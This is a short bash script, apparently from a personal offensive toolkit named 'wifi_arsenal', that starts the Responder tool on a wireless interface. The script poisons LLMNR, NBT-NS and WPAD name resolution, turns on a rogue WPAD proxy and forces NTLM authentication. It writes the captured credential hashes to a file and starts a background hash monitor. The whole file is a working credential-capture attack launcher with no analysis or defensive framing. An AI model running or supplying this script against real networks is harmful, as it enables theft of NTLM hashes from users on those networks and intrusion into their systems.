#!/bin/bash
# Start Responder for LLMNR/NBT-NS/WPAD poisoning

INTERFACE="${1:-alfa0}"
PID_FILE="/tmp/responder_pid.txt"
LOG_DIR="/home/ov3rr1d3/wifi_arsenal/captures/responder"
HASH_FILE="/home/ov3rr1d3/wifi_arsenal/captures/hashes/responder_hashes.txt"

mkdir -p "$LOG_DIR"
mkdir -p "$(dirname $HASH_FILE)"

# Check if already running
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    if ps -p "$OLD_PID" > /dev/null 2>&1; then
        echo "[-] Responder already running (PID: $OLD_PID)"
        exit 1
    fi
fi

echo "[*] Starting Responder on $INTERFACE"
echo "[*] Hash output: $HASH_FILE"

# Find Responder's log directory
RESPONDER_LOG_DIR="/usr/share/responder/logs"
if [ ! -d "$RESPONDER_LOG_DIR" ]; then
    RESPONDER_LOG_DIR="/var/lib/responder/logs"
fi

# Start Responder
# -I interface
# -w enable WPAD rogue proxy
# -r enable answers for netbios wredir suffix
# -d enable answers for netbios domain suffix
# -P force NTLM auth for WPAD
sudo responder -I "$INTERFACE" -w -r -d -P > "$LOG_DIR/responder.log" 2>&1 &
RESP_PID=$!
echo $RESP_PID > "$PID_FILE"

sleep 3

if ps -p $RESP_PID > /dev/null 2>&1; then
    echo "[+] Responder started (PID: $RESP_PID)"
    echo "[+] Poisoning LLMNR, NBT-NS, WPAD"
    echo "[+] Logs: $LOG_DIR/responder.log"
    
    # Start hash monitor in background
    nohup /home/ov3rr1d3/wifi_arsenal/scripts/internal/monitor_hashes.sh > /dev/null 2>&1 &
    echo "[+] Hash monitor started"
else
    echo "[-] Responder failed to start"
    cat "$LOG_DIR/responder.log"
    exit 1
fi
